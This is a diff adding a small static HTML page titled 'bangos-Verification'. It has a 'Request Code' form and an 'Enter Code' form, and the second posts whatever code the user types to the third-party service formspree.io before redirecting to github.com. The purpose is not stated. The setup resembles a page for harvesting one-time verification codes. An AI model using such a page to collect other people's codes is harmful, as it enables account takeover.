@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <title>bangos-Verification</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #1a1a1a url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      text-align: center;
+    }
+    .overlay {
+      background: rgba(0,0,0,0.6);
+      min-height: 100vh;
+      padding-top: 80px;
+    }
+    .container {
+      background: rgba(20,20,20,0.85);
+      padding: 30px;
+      width: 320px;
+      margin: auto;
+      border-radius: 10px;
+    }
+    .logo {
+      width: 250px;
+      margin-bottom: 20px;
+    }
+    input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 90%;
+      border-radius: 5px;
+      border: none;
+      color: #333;
+    }
+    button {
+      padding: 10px 20px;
+      border-radius: 5px;
+      border: none;
+      cursor: pointer;
+      background-color: #f0f0f0;
+      color: #333;
+      font-weight: bold;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #ddd;
+    }
+    hr {
+      margin: 20px 0;
+      border: 0;
+      border-top: 1px solid #444;
+    }
+  </style>
+</head>
+<body>
+
+<div class="overlay">
+  <div class="container">
+    <img src="logo.png" class="logo" alt="Logo">
+
+    <!-- REPLACES request.php -->
+    <h2>Request Code</h2>
+    <form action="https://formspree.io" method="POST">
+      <input type="hidden" name="_subject" value="Code Requested">
+      <input type="hidden" name="message" value="A user requested a verification code.">
+      <!-- Redirects back to your site after they click submit -->
+      <input type="hidden" name="_next" value="https://github.com"> 
+      <button type="submit">Request Code</button>
+    </form>
+
+    <hr>
+
+    <!-- REPLACES submit_code.php -->
+    <h2>Enter Code</h2>
+    <form action="https://formspree.io" method="POST">
+      <input type="hidden" name="_subject" value="Code Submitted">
+      <input type="text" name="entered_code" placeholder="Enter code" required>
+      <input type="hidden" name="_next" value="https://github.com">
+      <button type="submit">Submit Code</button>
+    </form>
+  </div>
+</div>
+
+</body>
+</html>
